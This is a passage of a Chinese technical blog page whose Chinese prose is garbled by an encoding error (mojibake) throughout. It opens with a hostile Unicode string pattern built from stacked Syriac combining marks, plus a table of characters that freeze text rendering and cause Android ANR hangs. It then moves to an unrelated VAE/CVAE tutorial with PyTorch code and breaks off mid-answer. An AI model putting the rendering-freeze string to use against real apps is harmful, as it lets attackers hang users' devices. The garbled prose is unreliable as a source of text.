è¾“å…¥çš„æ˜¯è¿™æ ·ä¸€ç§å­—ç¬¦ä¸²ç»“æ„ï¼š</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a1 + (\u0737 * n) + (\u0736 * n) + a2</span><br></pre></td></tr></table></figure><h4 id="ğŸ”¹-å…¶ä¸­çš„â€œæ”»å‡»æˆåˆ†â€å¦‚ä¸‹ï¼š"><a href="#ğŸ”¹-å…¶ä¸­çš„â€œæ”»å‡»æˆåˆ†â€å¦‚ä¸‹ï¼š" class="headerlink" title="ğŸ”¹ å…¶ä¸­çš„â€œæ”»å‡»æˆåˆ†â€å¦‚ä¸‹ï¼š"></a>ğŸ”¹ å…¶ä¸­çš„â€œæ”»å‡»æˆåˆ†â€å¦‚ä¸‹ï¼š</h4><table><thead><tr><th>å­—ç¬¦</th><th>åç§°</th><th>ç±»å‹</th><th>é£é™©ç‚¹</th></tr></thead><tbody><tr><td><code>\u0736</code>, <code>\u0737</code></td><td>Syriac Combining Marks</td><td>Combining Markï¼ˆå åŠ å­—ç¬¦ï¼‰</td><td>å åŠ åˆ°å‰ä¸€ä¸ªå­—ç¬¦ä¸Šï¼Œ<strong>å¯¼è‡´æ’ç‰ˆå’Œæ¸²æŸ“æå…¶å¤æ‚</strong></td></tr><tr><td><code>\u200d</code></td><td>Zero Width Joiner</td><td>æ§åˆ¶ç¬¦</td><td>ä¼šè¯•å›¾å°†å¤šä¸ªå­—ç¬¦åˆå¹¶æˆä¸€ä¸ªâ€œåˆå­—â€ï¼Œå¢å¤§å¤æ‚æ€§</td></tr><tr><td><code>\u206a</code></td><td>Inhibit Symmetric Swapping</td><td>æ–‡æœ¬æ§åˆ¶ç¬¦</td><td>æ”¹å˜å­—ç¬¦é¡ºåºå¤„ç†ï¼Œé€ æˆ RTL&#x2F;LTR æ··ä¹±</td></tr><tr><td><code>\u0f87</code>, <code>\u0f19</code>, <code>\ufb50</code></td><td>è—æ–‡ã€é˜¿æ‹‰ä¼¯åˆå­—</td><td>è„šæœ¬æ··åˆå­—ç¬¦</td><td>è§¦å‘å­—ä½“ fallback å’Œå­—å½¢æ¸²æŸ“</td></tr></tbody></table><h4 id="â˜ ï¸-å…¸å‹æ”»å‡»ç»„åˆæ•ˆåº”ï¼š"><a href="#â˜ ï¸-å…¸å‹æ”»å‡»ç»„åˆæ•ˆåº”ï¼š" class="headerlink" title="â˜ ï¸ å…¸å‹æ”»å‡»ç»„åˆæ•ˆåº”ï¼š"></a>â˜ ï¸ å…¸å‹æ”»å‡»ç»„åˆæ•ˆåº”ï¼š</h4><ul><li>å­—ç¬¦å‘ˆç°ä¸º <strong>ä¸€ä¸ªå­—ç¬¦ä¸Šå åŠ å‡ åå±‚ç¬¦å·</strong>ï¼ˆä¾‹å¦‚æ–œçº¿ã€ç‚¹ã€æ›²çº¿ï¼‰ã€‚</li><li>åŒæ—¶æ¿€æ´»å­—ä½“æ¸²æŸ“ç³»ç»Ÿçš„ï¼š<ul><li>å­—å½¢æŸ¥æ‰¾ï¼ˆglyph shapingï¼‰</li><li>åˆå­—å¤„ç†ï¼ˆligature resolutionï¼‰</li><li>æ–‡æœ¬æ–¹å‘åˆ†æï¼ˆBiDiï¼‰</li></ul></li><li>æ‰€æœ‰æ“ä½œéƒ½åœ¨ä¸»çº¿ç¨‹åŒæ­¥æ‰§è¡Œ â†’ ç›´æ¥å¼•å‘å¡é¡¿å’Œ ANRã€‚</li></ul><h2 id="å˜åˆ†ç¼–ç å™¨æ·»åŠ å™ªå£°"><a href="#å˜åˆ†ç¼–ç å™¨æ·»åŠ å™ªå£°" class="headerlink" title="å˜åˆ†ç¼–ç å™¨æ·»åŠ å™ªå£°"></a>å˜åˆ†ç¼–ç å™¨æ·»åŠ å™ªå£°</h2><p>VAE æ˜¯ä¸€ç§æ¦‚ç‡ç”Ÿæˆæ¨¡å‹ï¼Œå®ƒé€šè¿‡å˜åˆ†æ¨æ–­å­¦ä¹ è¾“å…¥æ•°æ®çš„æ½œåœ¨åˆ†å¸ƒï¼Œå°†ç¼–ç å™¨è¾“å‡ºä¸ºæ½œå˜é‡çš„åˆ†å¸ƒï¼ˆè€Œéå›ºå®šå‘é‡ï¼‰ï¼Œä½¿ç”¨é‡å‚æ•°æŠ€å·§è§£å†³æ¢¯åº¦ä¼ æ’­é—®é¢˜ï¼Œè®­ç»ƒç›®æ ‡æ˜¯æœ€å¤§åŒ– ELBOï¼Œä¹Ÿå°±æ˜¯é‡æ„è¯¯å·®ä¸ KL æ•£åº¦çš„åŠ æƒå’Œã€‚è€Œ CVAE æ˜¯ VAE çš„æ¡ä»¶æ‰©å±•ï¼Œé€šè¿‡å¼•å…¥æ¡ä»¶å˜é‡ y å®ç°æ¡ä»¶ç”Ÿæˆï¼Œæ¯”å¦‚ç»™å®šæ ‡ç­¾ç”Ÿæˆç‰¹å®šå›¾åƒã€‚ä¸¤è€…éƒ½å±äºæ·±åº¦ç”Ÿæˆæ¨¡å‹ï¼Œå¹¿æ³›åº”ç”¨äºå›¾åƒã€æ–‡æœ¬ã€è¯­éŸ³ç­‰é¢†åŸŸã€‚</p><h3 id="ä¸€ã€VAEï¼ˆå˜åˆ†è‡ªç¼–ç å™¨ï¼‰"><a href="#ä¸€ã€VAEï¼ˆå˜åˆ†è‡ªç¼–ç å™¨ï¼‰" class="headerlink" title="ä¸€ã€VAEï¼ˆå˜åˆ†è‡ªç¼–ç å™¨ï¼‰"></a>ä¸€ã€VAEï¼ˆå˜åˆ†è‡ªç¼–ç å™¨ï¼‰</h3><p>VAE æ˜¯ä¸€ç§ç”Ÿæˆæ¨¡å‹ï¼Œå®ƒç»“åˆäº†æ¦‚ç‡å›¾æ¨¡å‹å’Œç¥ç»ç½‘ç»œã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯é€šè¿‡å˜åˆ†æ¨ç†ï¼ˆVariational Inferenceï¼‰æ¥å­¦ä¹ æ•°æ®çš„æ½œåœ¨åˆ†å¸ƒï¼Œä»è€Œèƒ½å¤Ÿç”Ÿæˆæ–°çš„æ•°æ®æ ·æœ¬ã€‚</p><ul><li><strong>ç¼–ç å™¨ï¼ˆEncoderï¼‰</strong>ï¼šå°†è¾“å…¥æ•°æ®æ˜ å°„åˆ°æ½œåœ¨ç©ºé—´ï¼ˆLatent Spaceï¼‰ï¼Œå¾—åˆ°æ½œåœ¨å˜é‡çš„å‡å€¼å’Œæ–¹å·®ã€‚é€šå¸¸æ˜¯ä¸€ä¸ªç¥ç»ç½‘ç»œï¼Œè¾“å‡ºä¸¤ä¸ªå‘é‡ï¼Œåˆ†åˆ«ä»£è¡¨æ½œåœ¨å˜é‡çš„å‡å€¼å’Œæ–¹å·®ã€‚</li><li><strong>è§£ç å™¨ï¼ˆDecoderï¼‰</strong>ï¼šä»æ½œåœ¨ç©ºé—´é‡‡æ ·ï¼Œå°†æ½œåœ¨å˜é‡æ˜ å°„å›åŸå§‹æ•°æ®ç©ºé—´ï¼Œé‡æ„è¾“å…¥æ•°æ®ã€‚ä¹Ÿæ˜¯ä¸€ä¸ªç¥ç»ç½‘ç»œï¼Œä»¥æ½œåœ¨å˜é‡ä¸ºè¾“å…¥ï¼Œè¾“å‡ºé‡æ„çš„æ•°æ®ã€‚</li><li><strong>å˜åˆ†ä¸‹ç•Œï¼ˆEvidence Lower Bound, ELBOï¼‰</strong>ï¼šVAE çš„ä¼˜åŒ–ç›®æ ‡æ˜¯æœ€å¤§åŒ–å˜åˆ†ä¸‹ç•Œï¼Œå®ƒç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š<ul><li>é‡æ„è¯¯å·®ï¼ˆReconstruction Lossï¼‰ï¼šè¡¡é‡é‡æ„æ•°æ®ä¸åŸå§‹æ•°æ®çš„å·®å¼‚ï¼Œé€šå¸¸ä½¿ç”¨å‡æ–¹è¯¯å·®ï¼ˆMSEï¼‰æˆ–äº¤å‰ç†µæŸå¤±ã€‚</li><li>æ­£åˆ™åŒ–é¡¹ï¼ˆKL Divergenceï¼‰ï¼šè¡¡é‡æ½œåœ¨å˜é‡åˆ†å¸ƒä¸å…ˆéªŒåˆ†å¸ƒï¼ˆé€šå¸¸ä¸ºæ ‡å‡†æ­£æ€åˆ†å¸ƒï¼‰çš„å·®å¼‚ï¼Œç”¨äºé˜²æ­¢è¿‡æ‹Ÿåˆå¹¶é¼“åŠ±å­¦ä¹ ç´§å‡‘çš„æ½œåœ¨è¡¨ç¤ºã€‚</li></ul></li></ul><ol start="2"><li>æ•°å­¦å…¬å¼</li></ol><ul><li>ç¼–ç å™¨è¾“å‡ºï¼šå¯¹äºè¾“å…¥æ•°æ® (x)ï¼Œç¼–ç å™¨è¾“å‡ºå‡å€¼ (\mu(x)) å’Œæ–¹å·® (\sigma^2(x))ã€‚</li><li>é‡å‚æ•°åŒ–æŠ€å·§ï¼ˆReparameterization Trickï¼‰ï¼šä¸ºäº†èƒ½å¤Ÿè¿›è¡Œæ¢¯åº¦ä¸‹é™ä¼˜åŒ–ï¼Œå¼•å…¥éšæœºå˜é‡ (\epsilon \sim \mathcal{N}(0, I))ï¼Œæ½œåœ¨å˜é‡ (z) è¡¨ç¤ºä¸º (z &#x3D; \mu(x) + \sigma(x) \odot \epsilon)ï¼Œå…¶ä¸­ (\odot) è¡¨ç¤ºé€å…ƒç´ ç›¸ä¹˜ã€‚</li><li>å˜åˆ†ä¸‹ç•Œï¼ˆELBOï¼‰ï¼š(\mathcal{L}(x) &#x3D; \mathbb{E}_{z \sim q_\phi(z|x)}[\log p_\theta(x|z)] - \text{KL}(q_\phi(z|x) | p(z)))ï¼Œå…¶ä¸­ (q_\phi(z|x)) æ˜¯ç¼–ç å™¨åˆ†å¸ƒï¼Œ(p_\theta(x|z)) æ˜¯è§£ç å™¨åˆ†å¸ƒï¼Œ(p(z)) æ˜¯å…ˆéªŒåˆ†å¸ƒã€‚</li></ul><ol start="3"><li>è®­ç»ƒè¿‡ç¨‹</li></ol><ul><li>å‰å‘ä¼ æ’­ï¼šè¾“å…¥æ•°æ®é€šè¿‡ç¼–ç å™¨å¾—åˆ°æ½œåœ¨å˜é‡çš„å‡å€¼å’Œæ–¹å·®ï¼Œåˆ©ç”¨é‡å‚æ•°åŒ–æŠ€å·§é‡‡æ ·å¾—åˆ°æ½œåœ¨å˜é‡ï¼Œç„¶åé€šè¿‡è§£ç å™¨é‡æ„æ•°æ®ã€‚</li><li>æŸå¤±è®¡ç®—ï¼šè®¡ç®—é‡æ„è¯¯å·®å’Œ KL æ•£åº¦ï¼Œå¾—åˆ°æ€»æŸå¤±ã€‚</li><li>åå‘ä¼ æ’­ï¼šé€šè¿‡æ¢¯åº¦ä¸‹é™ä¼˜åŒ–æŸå¤±å‡½æ•°ï¼Œæ›´æ–°ç¼–ç å™¨å’Œè§£ç å™¨çš„å‚æ•°ã€‚</li></ul><ol start="4"><li>ç”Ÿæˆæ–°æ ·æœ¬</li></ol><ul><li>é‡‡æ ·ï¼šä»å…ˆéªŒåˆ†å¸ƒ (p(z)) ä¸­é‡‡æ ·æ½œåœ¨å˜é‡ (z)ã€‚</li><li>è§£ç ï¼šå°†æ½œåœ¨å˜é‡é€šè¿‡è§£ç å™¨ç”Ÿæˆæ–°çš„æ•°æ®æ ·æœ¬ã€‚</li></ul><h3 id="äºŒã€CVAEï¼ˆæ¡ä»¶å˜åˆ†è‡ªç¼–ç å™¨ï¼‰"><a href="#äºŒã€CVAEï¼ˆæ¡ä»¶å˜åˆ†è‡ªç¼–ç å™¨ï¼‰" class="headerlink" title="äºŒã€CVAEï¼ˆæ¡ä»¶å˜åˆ†è‡ªç¼–ç å™¨ï¼‰"></a>äºŒã€CVAEï¼ˆæ¡ä»¶å˜åˆ†è‡ªç¼–ç å™¨ï¼‰</h3><ol><li>åŸºæœ¬åŸç†<br>CVAE æ˜¯ VAE çš„æ‰©å±•ï¼Œå®ƒå¼•å…¥äº†æ¡ä»¶å˜é‡ï¼ˆCondition Variableï¼‰ï¼Œä½¿å¾—ç”Ÿæˆè¿‡ç¨‹å¯ä»¥å—åˆ°æ¡ä»¶çš„æ§åˆ¶ã€‚è¿™åœ¨è®¸å¤šä»»åŠ¡ä¸­éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚æ¡ä»¶å›¾åƒç”Ÿæˆã€æ¡ä»¶æ–‡æœ¬ç”Ÿæˆç­‰ã€‚</li></ol><ul><li><strong>æ¡ä»¶ç¼–ç å™¨ï¼ˆConditional Encoderï¼‰</strong>ï¼šå°†è¾“å…¥æ•°æ®å’Œæ¡ä»¶å˜é‡ä¸€èµ·ç¼–ç åˆ°æ½œåœ¨ç©ºé—´ï¼Œå¾—åˆ°æ½œåœ¨å˜é‡çš„åˆ†å¸ƒã€‚</li><li><strong>æ¡ä»¶è§£ç å™¨ï¼ˆConditional Decoderï¼‰</strong>ï¼šä»æ½œåœ¨ç©ºé—´é‡‡æ ·ï¼Œå¹¶ç»“åˆæ¡ä»¶å˜é‡ï¼Œå°†æ½œåœ¨å˜é‡å’Œæ¡ä»¶å˜é‡ä¸€èµ·æ˜ å°„å›åŸå§‹æ•°æ®ç©ºé—´ï¼Œç”Ÿæˆæ¡ä»¶æ•°æ®ã€‚</li><li><strong>ä¼˜åŒ–ç›®æ ‡</strong>ï¼šä¸ VAE ç±»ä¼¼ï¼Œä¹Ÿæ˜¯æœ€å¤§åŒ–å˜åˆ†ä¸‹ç•Œï¼Œä½†éœ€è¦è€ƒè™‘æ¡ä»¶å˜é‡çš„å½±å“ã€‚</li></ul><ol start="2"><li>æ•°å­¦å…¬å¼</li></ol><ul><li>ç¼–ç å™¨åˆ†å¸ƒï¼š(q_\phi(z|x, y))ï¼Œå…¶ä¸­ (y) æ˜¯æ¡ä»¶å˜é‡ã€‚</li><li>è§£ç å™¨åˆ†å¸ƒï¼š(p_\theta(x|z, y))ã€‚</li><li>å˜åˆ†ä¸‹ç•Œï¼ˆELBOï¼‰ï¼š(\mathcal{L}(x, y) &#x3D; \mathbb{E}_{z \sim q_\phi(z|x, y)}[\log p_\theta(x|z, y)] - \text{KL}(q_\phi(z|x, y) | p(z)))ã€‚</li></ul><ol start="3"><li>è®­ç»ƒè¿‡ç¨‹</li></ol><ul><li>å‰å‘ä¼ æ’­ï¼šè¾“å…¥æ•°æ®å’Œæ¡ä»¶å˜é‡é€šè¿‡ç¼–ç å™¨å¾—åˆ°æ½œåœ¨å˜é‡çš„åˆ†å¸ƒï¼Œé‡‡æ ·å¾—åˆ°æ½œåœ¨å˜é‡ï¼Œç„¶åé€šè¿‡è§£ç å™¨ç”Ÿæˆæ¡ä»¶æ•°æ®ã€‚</li><li>æŸå¤±è®¡ç®—ï¼šè®¡ç®—é‡æ„è¯¯å·®å’Œ KL æ•£åº¦ï¼Œå¾—åˆ°æ€»æŸå¤±ã€‚</li><li>åå‘ä¼ æ’­ï¼šä¼˜åŒ–æŸå¤±å‡½æ•°ï¼Œæ›´æ–°ç¼–ç å™¨å’Œè§£ç å™¨çš„å‚æ•°ã€‚</li></ul><ol start="4"><li>ç”Ÿæˆæ–°æ ·æœ¬</li></ol><ul><li>é‡‡æ ·ï¼šä»å…ˆéªŒåˆ†å¸ƒ (p(z)) ä¸­é‡‡æ ·æ½œåœ¨å˜é‡ (z)ã€‚</li><li>è§£ç ï¼šå°†æ½œåœ¨å˜é‡å’Œæ¡ä»¶å˜é‡é€šè¿‡è§£ç å™¨ç”Ÿæˆæ–°çš„æ¡ä»¶æ•°æ®æ ·æœ¬ã€‚</li></ul><h3 id="VAE-å®ç°"><a href="#VAE-å®ç°" class="headerlink" title="VAE å®ç°"></a>VAE å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VAE</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, input_dim, hidden_dim, latent_dim</span>):</span><br><span class="line">        <span class="built_in">super</span>(VAE, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç¼–ç å™¨</span></span><br><span class="line">        <span class="variable language_">self</span>.fc1 = nn.Linear(input_dim, hidden_dim)</span><br><span class="line">        <span class="variable language_">self</span>.fc2_mu = nn.Linear(hidden_dim, latent_dim)</span><br><span class="line">        <span class="variable language_">self</span>.fc2_logvar = nn.Linear(hidden_dim, latent_dim)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è§£ç å™¨</span></span><br><span class="line">        <span class="variable language_">self</span>.fc3 = nn.Linear(latent_dim, hidden_dim)</span><br><span class="line">        <span class="variable language_">self</span>.fc4 = nn.Linear(hidden_dim, input_dim)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, x</span>):</span><br><span class="line">        h = F.relu(<span class="variable language_">self</span>.fc1(x))</span><br><span class="line">        mu = <span class="variable language_">self</span>.fc2_mu(h)</span><br><span class="line">        logvar = <span class="variable language_">self</span>.fc2_logvar(h)</span><br><span class="line">        <span class="keyword">return</span> mu, logvar</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reparameterize</span>(<span class="params">self, mu, logvar</span>):</span><br><span class="line">        std = torch.exp(<span class="number">0.5</span> * logvar)</span><br><span class="line">        eps = torch.randn_like(std)</span><br><span class="line">        <span class="keyword">return</span> mu + eps * std</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, z</span>):</span><br><span class="line">        h = F.relu(<span class="variable language_">self</span>.fc3(z))</span><br><span class="line">        <span class="keyword">return</span> torch.sigmoid(<span class="variable language_">self</span>.fc4(h))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        mu, logvar = <span class="variable language_">self</span>.encode(x)</span><br><span class="line">        z = <span class="variable language_">self</span>.reparameterize(mu, logvar)</span><br><span class="line">        x_reconst = <span class="variable language_">self</span>.decode(z)</span><br><span class="line">        <span class="keyword">return</span> x_reconst, mu, logvar</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸå¤±å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vae_loss</span>(<span class="params">reconst, x, mu, logvar</span>):</span><br><span class="line">    reconst_loss = F.binary_cross_entropy(reconst, x, reduction=<span class="string">&#x27;sum&#x27;</span>)</span><br><span class="line">    kl_div = -<span class="number">0.5</span> * torch.<span class="built_in">sum</span>(<span class="number">1</span> + logvar - mu.<span class="built_in">pow</span>(<span class="number">2</span>) - logvar.exp())</span><br><span class="line">    <span class="keyword">return</span> reconst_loss + kl_div</span><br></pre></td></tr></table></figure><h3 id="CVAE-å®ç°"><a href="#CVAE-å®ç°" class="headerlink" title="CVAE å®ç°"></a>CVAE å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CVAE</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, input_dim, condition_dim, hidden_dim, latent_dim</span>):</span><br><span class="line">        <span class="built_in">super</span>(CVAE, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç¼–ç å™¨</span></span><br><span class="line">        <span class="variable language_">self</span>.fc1 = nn.Linear(input_dim + condition_dim, hidden_dim)</span><br><span class="line">        <span class="variable language_">self</span>.fc2_mu = nn.Linear(hidden_dim, latent_dim)</span><br><span class="line">        <span class="variable language_">self</span>.fc2_logvar = nn.Linear(hidden_dim, latent_dim)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è§£ç å™¨</span></span><br><span class="line">        <span class="variable language_">self</span>.fc3 = nn.Linear(latent_dim + condition_dim, hidden_dim)</span><br><span class="line">        <span class="variable language_">self</span>.fc4 = nn.Linear(hidden_dim, input_dim)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="built_in">input</span> = torch.cat([x, y], dim=<span class="number">1</span>)</span><br><span class="line">        h = F.relu(<span class="variable language_">self</span>.fc1(<span class="built_in">input</span>))</span><br><span class="line">        mu = <span class="variable language_">self</span>.fc2_mu(h)</span><br><span class="line">        logvar = <span class="variable language_">self</span>.fc2_logvar(h)</span><br><span class="line">        <span class="keyword">return</span> mu, logvar</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reparameterize</span>(<span class="params">self, mu, logvar</span>):</span><br><span class="line">        std = torch.exp(<span class="number">0.5</span> * logvar)</span><br><span class="line">        eps = torch.randn_like(std)</span><br><span class="line">        <span class="keyword">return</span> mu + eps * std</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, z, y</span>):</span><br><span class="line">        <span class="built_in">input</span> = torch.cat([z, y], dim=<span class="number">1</span>)</span><br><span class="line">        h = F.relu(<span class="variable language_">self</span>.fc3(<span class="built_in">input</span>))</span><br><span class="line">        <span class="keyword">return</span> torch.sigmoid(<span class="variable language_">self</span>.fc4(h))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        mu, logvar = <span class="variable language_">self</span>.encode(x, y)</span><br><span class="line">        z = <span class="variable language_">self</span>.reparameterize(mu, logvar)</span><br><span class="line">        x_reconst = <span class="variable language_">self</span>.decode(z, y)</span><br><span class="line">        <span class="keyword">return</span> x_reconst, mu, logvar</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸå¤±å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cvae_loss</span>(<span class="params">reconst, x, mu, logvar</span>):</span><br><span class="line">    reconst_loss = F.binary_cross_entropy(reconst, x, reduction=<span class="string">&#x27;sum&#x27;</span>)</span><br><span class="line">    kl_div = -<span class="number">0.5</span> * torch.<span class="built_in">sum</span>(<span class="number">1</span> + logvar - mu.<span class="built_in">pow</span>(<span class="number">2</span>) - logvar.exp())</span><br><span class="line">    <span class="keyword">return</span> reconst_loss + kl_div</span><br></pre></td></tr></table></figure><h3 id="VAE-åº”ç”¨æ¡ˆä¾‹"><a href="#VAE-åº”ç”¨æ¡ˆä¾‹" class="headerlink" title="VAE åº”ç”¨æ¡ˆä¾‹"></a>VAE åº”ç”¨æ¡ˆä¾‹</h3><ul><li><strong>å›¾åƒç”Ÿæˆ</strong>ï¼šä½¿ç”¨ VAE ç”Ÿæˆæ‰‹å†™æ•°å­—ï¼ˆMNIST æ•°æ®é›†ï¼‰ã€äººè„¸å›¾åƒç­‰ã€‚</li><li><strong>æ•°æ®å‹ç¼©</strong>ï¼šé€šè¿‡å­¦ä¹ æ•°æ®çš„æ½œåœ¨è¡¨ç¤ºï¼Œå®ç°æ•°æ®çš„å‹ç¼©å’Œé™ç»´ã€‚</li></ul><h3 id="CVAE-åº”ç”¨æ¡ˆä¾‹"><a href="#CVAE-åº”ç”¨æ¡ˆä¾‹" class="headerlink" title="CVAE åº”ç”¨æ¡ˆä¾‹"></a>CVAE åº”ç”¨æ¡ˆä¾‹</h3><ul><li><strong>æ¡ä»¶å›¾åƒç”Ÿæˆ</strong>ï¼šæ ¹æ®ç»™å®šçš„æ ‡ç­¾æˆ–å±æ€§ç”Ÿæˆç‰¹å®šçš„å›¾åƒï¼Œä¾‹å¦‚ç”Ÿæˆç‰¹å®šæ•°å­—çš„æ‰‹å†™å›¾åƒã€å…·æœ‰ç‰¹å®šè¡¨æƒ…çš„äººè„¸å›¾åƒç­‰ã€‚</li><li><strong>æ¡ä»¶æ–‡æœ¬ç”Ÿæˆ</strong>ï¼šæ ¹æ®ç»™å®šçš„ä¸»é¢˜æˆ–æƒ…æ„Ÿç”Ÿæˆç›¸åº”çš„æ–‡æœ¬å†…å®¹ã€‚</li></ul><h3 id="VAE-ç›¸å…³é—®é¢˜"><a href="#VAE-ç›¸å…³é—®é¢˜" class="headerlink" title="VAE ç›¸å…³é—®é¢˜"></a>VAE ç›¸å…³é—®é¢˜</h3><ol><li><p><strong>VAE çš„æ ¸å¿ƒæ€æƒ³æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li>VAE ç»“åˆäº†æ¦‚ç‡å›¾æ¨¡å‹å’Œç¥ç»ç½‘ç»œï¼Œé€šè¿‡å˜åˆ†æ¨ç†å­¦ä¹ æ•°æ®çš„æ½œåœ¨åˆ†å¸ƒï¼Œä»è€Œèƒ½å¤Ÿç”Ÿæˆæ–°çš„æ•°æ®æ ·æœ¬ã€‚</li></ul></li><li><p><strong>VAE çš„ç¼–ç å™¨å’Œè§£ç å™¨åˆ†åˆ«èµ·ä»€ä¹ˆä½œç”¨ï¼Ÿ</strong></p><ul><li>ç¼–ç å™¨å°†è¾“å…¥æ•°æ®æ˜ å°„åˆ°æ½œåœ¨ç©ºé—´ï¼Œå¾—åˆ°æ½œåœ¨å˜é‡çš„å‡å€¼å’Œæ–¹å·®ï¼›è§£ç å™¨ä»æ½œåœ¨ç©ºé—´é‡‡æ ·ï¼Œå°†æ½œåœ¨å˜é‡æ˜ å°„å›åŸå§‹æ•°æ®ç©ºé—´ï¼Œé‡æ„è¾“å…¥æ•°æ®ã€‚</li></ul></li><li><p><strong>VAE çš„ä¼˜åŒ–ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li>VAE çš„ä¼˜åŒ–ç›®æ ‡æ˜¯æœ€å¤§åŒ–å˜åˆ†ä¸‹ç•Œï¼ˆELBOï¼‰ï¼Œå®ƒç”±é‡æ„è¯¯å·®å’Œæ­£åˆ™åŒ–é¡¹ï¼ˆKL æ•£åº¦ï¼‰ç»„æˆã€‚</li></ul></li><li><p><strong>å¦‚ä½•å¤„ç† VAE ä¸­çš„ä¸å¯å¾®é—®é¢˜ï¼Ÿ</strong></p><ul><li>ä½¿ç”¨é‡å‚æ•°åŒ–æŠ€å·§ï¼ˆReparameterization Trickï¼‰ï¼Œå°†éšæœºæ€§ä»å˜é‡ä¸­åˆ†ç¦»å‡ºæ¥ï¼Œä½¿å¾—å¯ä»¥é€šè¿‡æ¢¯åº¦ä¸‹é™è¿›è¡Œä¼˜åŒ–ã€‚</li></ul></li><li><p><strong>VAE ä¸è‡ªç¼–ç å™¨ï¼ˆAutoencoderï¼‰çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li>VAE æ˜¯ä¸€ç§ç”Ÿæˆæ¨¡å‹ï¼Œå­¦ä¹ æ•°æ®çš„æ¦‚ç‡åˆ†å¸ƒï¼›è€Œè‡ªç¼–ç å™¨ä¸»è¦ç”¨äºæ•°æ®çš„å‹ç¼©å’Œé‡æ„ï¼Œä¸ç›´æ¥ç”¨äºç”Ÿæˆæ–°æ ·æœ¬ã€‚</li></ul></li></ol><h3 id="CVAE-ç›¸å…³é—®é¢˜"><a href="#CVAE-ç›¸å…³é—®é¢˜" class="headerlink" title="CVAE ç›¸å…³é—®é¢˜"></a>CVAE ç›¸å…³é—®é¢˜</h3><ol><li><p><strong>CVAE çš„æ ¸å¿ƒæ€æƒ³æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li>CVAE æ˜¯ VAE 